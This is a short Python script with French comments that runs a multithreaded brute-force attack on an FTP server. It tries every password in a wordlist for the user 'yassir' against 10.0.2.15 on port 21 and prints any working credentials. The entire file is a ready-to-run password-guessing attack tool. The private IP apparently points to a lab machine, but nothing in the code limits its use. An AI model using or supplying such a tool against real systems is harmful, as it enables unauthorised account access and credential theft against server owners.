import sys
import threading
from ftplib import FTP

def ftp_login(target, username, password, port):
    # Tente de se connecter au serveur FTP avec les identifiants fournis.
    try:
        ftp = FTP()
        ftp.connect(target, port)  # Établit une connexion avec le serveur FTP sur le port spécifié.
        ftp.login(username, password)  # Tente de se connecter avec les identifiants.
        ftp.quit()  # Ferme la connexion FTP après une connexion réussie.
        print("\n[!] Credentials found.")
        print("\n[!] Username: {}".format(username))
        print("\n[!] Password: {}".format(password))
        sys.exit(0)  # Arrête le script après avoir trouvé les bons identifiants.
    except Exception as e:
        pass  # Ignore toute exception et continue (c'est-à-dire passe au prochain mot de passe).

def brute_force_chunk(target, username, wordlist_chunk, port):
    # Prend un segment de la liste de mots de passe et tente chaque mot de passe sur le serveur FTP.
    for password in wordlist_chunk:
        password = password.strip()  # Supprime les espaces superflus autour des mots de passe.
        ftp_login(target, username, password, port)  # Appelle ftp_login pour chaque mot de passe.

def brute_force(target, username, wordlist, port):
    # Coordonne l'attaque par force brute en utilisant du multithreading.
    try:
        with open(wordlist, "r") as wordlist_file:  # Ouvre le fichier contenant les mots de passe.
            words = wordlist_file.readlines()
            chunk_size = len(words) // 50  # Calcule la taille de chaque segment de mots de passe.
            wordlist_chunks = [words[i:i + chunk_size] for i in range(0, len(words), chunk_size)]  # Divise les mots de passe en 50 segments.

            threads = []
            for chunk in wordlist_chunks:
                thread = threading.Thread(target=brute_force_chunk, args=(target, username, chunk, port))
                thread.start()  # Démarre un thread pour chaque segment.
                threads.append(thread)

            for thread in threads:
                thread.join()  # Attend que tous les threads terminent.

    except FileNotFoundError:
        print("\n[-] There is no such wordlist file.\n")  # Gère le cas où le fichier de mots de passe n'est pas trouvé.
        sys.exit(1)

    print("\n[-] Brute force finished.\n")  # Affiche un message à la fin de l'attaque par force brute.

# Appelle la fonction brute_force avec les paramètres spécifiés pour démarrer l'attaque.
brute_force("10.0.2.15", "yassir", "/usr/share/wordlists/fasttrack.txt", 21)
